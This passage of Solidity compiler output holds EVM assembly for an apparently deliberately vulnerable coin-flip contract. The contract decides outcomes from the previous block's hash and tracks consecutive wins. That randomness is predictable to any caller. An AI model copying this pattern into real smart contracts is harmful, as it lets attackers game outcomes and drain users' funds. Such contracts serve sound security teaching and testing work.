									"end": 902,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 174,
									"end": 902,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 174,
									"end": 902,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 174,
									"end": 902,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 174,
									"end": 902,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212209a326eb189ffeb285007855b6c35f7f357dd3c031edb8b30ed9346544a75f3f064736f6c634300080f0033",
									".code": [
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "1D263F67"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "E6F334D7"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 174,
											"end": 902,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 174,
											"end": 902,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 446,
											"end": 899,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 446,
											"end": 899,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 446,
											"end": 899,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 230,
											"end": 260,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 230,
											"end": 260,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 489,
											"end": 493,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 502,
											"end": 520,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 541,
											"end": 560,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 558,
											"end": 559,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 541,
											"end": 553,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 541,
											"end": 557,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 541,
											"end": 557,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 541,
											"end": 560,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 541,
											"end": 560,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 541,
											"end": 560,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 541,
											"end": 560,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 541,
											"end": 560,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 541,
											"end": 560,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 541,
											"end": 560,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 531,
											"end": 561,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 523,
											"end": 562,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 523,
											"end": 562,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 502,
											"end": 562,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 502,
											"end": 562,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 587,
											"end": 597,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 575,
											"end": 583,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 575,
											"end": 583,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 575,
											"end": 597,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 571,
											"end": 624,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 571,
											"end": 624,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 608,
											"end": 616,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 608,
											"end": 616,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 608,
											"end": 616,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 571,
											"end": 624,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 571,
											"end": 624,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 643,
											"end": 653,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 632,
											"end": 640,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 632,
											"end": 653,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 632,
											"end": 653,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 632,
											"end": 653,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 632,
											"end": 653,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 660,
											"end": 676,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 679,
											"end": 701,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 694,
											"end": 700,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 694,
											"end": 700,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 679,
											"end": 689,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 679,
											"end": 693,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 679,
											"end": 693,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 679,
											"end": 701,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 679,
											"end": 701,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 679,
											"end": 701,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 679,
											"end": 701,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 679,
											"end": 701,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 679,
											"end": 701,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 679,
											"end": 701,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 660,
											"end": 701,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 660,
											"end": 701,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 708,
											"end": 717,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 732,
											"end": 733,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 720,
											"end": 728,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 720,
											"end": 733,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 720,
											"end": 748,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 720,
											"end": 748,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 743,
											"end": 748,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 720,
											"end": 748,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 720,
											"end": 748,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 720,
											"end": 748,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 720,
											"end": 748,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 736,
											"end": 740,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 720,
											"end": 748,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 720,
											"end": 748,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 708,
											"end": 748,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 708,
											"end": 748,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 769,
											"end": 775,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 761,
											"end": 775,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 761,
											"end": 775,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 761,
											"end": 765,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 761,
											"end": 775,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 761,
											"end": 775,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 761,
											"end": 775,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 757,
											"end": 894,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 757,
											"end": 894,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 786,
											"end": 801,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 786,
											"end": 801,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 786,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 786,
											"end": 803,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 786,
											"end": 803,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 786,
											"end": 803,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 819,
											"end": 823,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 812,
											"end": 823,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 812,
											"end": 823,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 812,
											"end": 823,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 812,
											"end": 823,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 812,
											"end": 823,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 812,
											"end": 823,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 812,
											"end": 823,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 757,
											"end": 894,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 757,
											"end": 894,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 864,
											"end": 865,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 846,
											"end": 861,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 846,
											"end": 865,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 846,
											"end": 865,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 846,
											"end": 865,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 846,
											"end": 865,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 881,
											"end": 886,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 874,
											"end": 886,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 874,
											"end": 886,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 874,
											"end": 886,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 874,
											"end": 886,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 874,
											"end": 886,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 446,
											"end": 899,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 446,
											"end": 899,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 230,
											"end": 260,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 230,
											"end": 260,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 3122,
											"end": 3218,
											"name": "tag",
											"source": 2,
											"value": "17"
										},
										{
											"begin": 3122,
											"end": 3218,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3180,
											"end": 3187,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3210,
											"end": 3211,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3206,
											"end": 3207,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3206,
											"end": 3211,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 3206,
											"end": 3211,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3206,
											"end": 3211,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3206,
											"end": 3211,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 3206,
											"end": 3211,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3206,
											"end": 3211,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 3206,
											"end": 3211,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3199,
											"end": 3211,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3199,
											"end": 3211,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3122,
											"end": 3218,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3122,
											"end": 3218,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3122,
											"end": 3218,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3122,
											"end": 3218,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3122,
											"end": 3218,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3850,
											"end": 3946,
											"name": "tag",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3850,
											"end": 3946,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3908,
											"end": 3915,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3938,
											"end": 3939,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 3934,
											"end": 3935,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 3934,
											"end": 3939,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 3934,
											"end": 3939,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3934,
											"end": 3939,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3934,
											"end": 3939,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 3934,
											"end": 3939,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3934,
											"end": 3939,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 3934,
											"end": 3939,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3927,
											"end": 3939,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 3927,
											"end": 3939,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3850,
											"end": 3946,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3850,
											"end": 3946,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3850,
											"end": 3946,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3850,
											"end": 3946,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3850,
											"end": 3946,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "tag",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 334,
											"end": 424,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 368,
											"end": 375,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 416,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 404,
											"end": 417,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 397,
											"end": 418,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 386,
											"end": 418,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 386,
											"end": 418,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 334,
											"end": 424,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 430,
											"end": 546,
											"name": "tag",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 430,
											"end": 546,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 500,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 515,
											"end": 520,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 500,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 500,
											"end": 521,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 500,
											"end": 521,
											"name": "tag",
											"source": 3,
											"value": "50"
										},
										{
											"begin": 500,
											"end": 521,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 493,
											"end": 498,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 490,
											"end": 522,
											"name": "EQ",
											"source": 3
										},
										{
											"begin": 480,
											"end": 540,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "51"
										},
										{
											"begin": 480,
											"end": 540,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 536,
											"end": 537,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 533,
											"end": 534,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 526,
											"end": 538,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 480,
											"end": 540,
											"name": "tag",
											"source": 3,
											"value": "51"
										},
										{
											"begin": 480,
											"end": 540,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 430,
											"end": 546,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 430,
											"end": 546,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "tag",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 552,
											"end": 685,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 595,
											"end": 600,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 633,
											"end": 639,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 620,
											"end": 640,
											"name": "CALLDATALOAD",
											"source": 3
										},
										{
											"begin": 611,
											"end": 640,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 611,
											"end": 640,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 649,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "53"
										},
										{
											"begin": 673,
											"end": 678,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 649,
											"end": 679,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "37"
										},
										{
											"begin": 649,
											"end": 679,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 649,
											"end": 679,
											"name": "tag",
											"source": 3,
											"value": "53"
										},
										{
											"begin": 649,
											"end": 679,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"jumpType": "[out]",
											"name": "JUMP",
